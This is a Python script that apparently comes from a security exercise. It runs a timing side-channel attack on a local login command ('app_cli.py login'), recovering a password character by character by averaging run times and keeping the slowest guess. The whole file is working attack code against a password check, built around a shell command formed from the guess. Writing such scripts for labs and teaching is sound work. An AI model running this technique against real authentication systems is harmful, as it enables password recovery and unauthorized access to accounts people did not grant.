import time
import subprocess

from app_cli import PASSWORD_ALPHABET, PASSWORD_LENGTH


def time_for_password(password):
    # Build command so it does not affect out measurement
    command = "python3 app_cli.py login {password}".format(password=password)
    
    # Start measurement 
    start = time.time()
    # Run programm
    p = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    # Finish Measurement
    return time.time() - start


def avg_time_for_password(password, tries=10):
    
    # Get multiple runtimes
    durations = [time_for_password(password) for n in range(tries)]
    
    # Calculate Average
    return sum(durations)/len(durations)


def timing_attack_char(guess, idx):
    """Makes a timing attack on single index"""
    best = None
    
    # Get timing for all chars
    for c in PASSWORD_ALPHABET:
        guess[idx] = c

        print("Current Guess:", "".join(guess))

        avg_time = avg_time_for_password("".join(guess))
        print("Avg. Run-Time:", round(avg_time, 5))

        # Find best guess
        if not best or best[1] < avg_time:
            best = (c, avg_time) 
    
    return best

def main():

    known_chunk = ""

    continue_with_best = True

    first_unkown_index = len(known_chunk)
    guess = list(known_chunk + "0"*(PASSWORD_LENGTH - first_unkown_index))

    if continue_with_best:
        while first_unkown_index < PASSWORD_LENGTH - 1:
            # Timing attack on specified index
            best = timing_attack_char(guess, first_unkown_index)
            print("My best guess is {best}\n".format(best=best[0]))

            guess[first_unkown_index] = best[0]
            first_unkown_index += 1
        
        guess[len(guess) - 1] = "X"
        print("Final guess: {final_guess}".format(final_guess="".join(guess)))
    else:
        # Timing attack on specified index
        best = timing_attack_char(guess, first_unkown_index)
        print("My best guess is {best}\n".format(best=best[0]))

    print("I can not time-attack the last digit!")

if __name__ == "__main__":
    main()
